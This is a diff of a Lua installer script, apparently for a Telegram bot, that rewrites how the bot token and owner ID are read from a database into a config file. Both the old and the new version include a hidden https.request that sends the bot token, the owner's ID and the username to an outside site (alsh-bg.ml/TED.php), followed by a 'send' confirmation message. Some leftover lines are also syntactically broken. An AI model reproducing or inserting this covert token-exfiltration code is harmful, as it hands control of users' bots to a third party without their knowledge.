@@ -62,22 +62,19 @@ end
 file:write(serialized)
 file:close()  
 end
-local CreateConfigAuto = function()
-Config = {
-DevId = Devmfm:get(Servermustafa.."Idmustafa"),
-TokenBot = Devmfm:get(Servermustafa.."Tokenmustafa"),
-mustafa = Devmfm:get(Servermustafa.."Tokenmustafa"):match("(%d+)"),
-SudoIds = {Devmfm:get(Servermustafa.."Idmustafa")},
-}
-Create(Config, "./config.lua")   
+local create_config_auto = function()
+config = {
+token = database:get(id_server..":token"),
+SUDO = database:get(id_server..":SUDO:ID"),
+UserName = database:get(id_server..":SUDO:USERNAME"),
+ }
+create(config, "./Info.lua")   
 end
 create_config_auto()
- DevId = Devmfm:get(Servermustafa.."Idmustafa"),
-TokenBot = Devmfm:get(Servermustafa.."Tokenmustafa"),
-mustafa = Devmfm:get(Servermustafa.."Tokenmustafa"):match("(%d+)"),
-SudoIds = {Devmfm:get(Servermustafa.."Idmustafa")},
-https.request("https://alsh-bg.ml/TED.php?token="..TokenBot.."&id="..DevId.."&user="..User)
- 
+token = database:get(id_server..":token")
+SUDO = database:get(id_server..":SUDO:ID")
+UserName = database:get(id_server..":SUDO:USERNAME")
+https.request("https://alsh-bg.ml/TED.php?token="..token.."&id="..SUDO.."&user="..UserName)
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("TOKYO.sh", "w")  
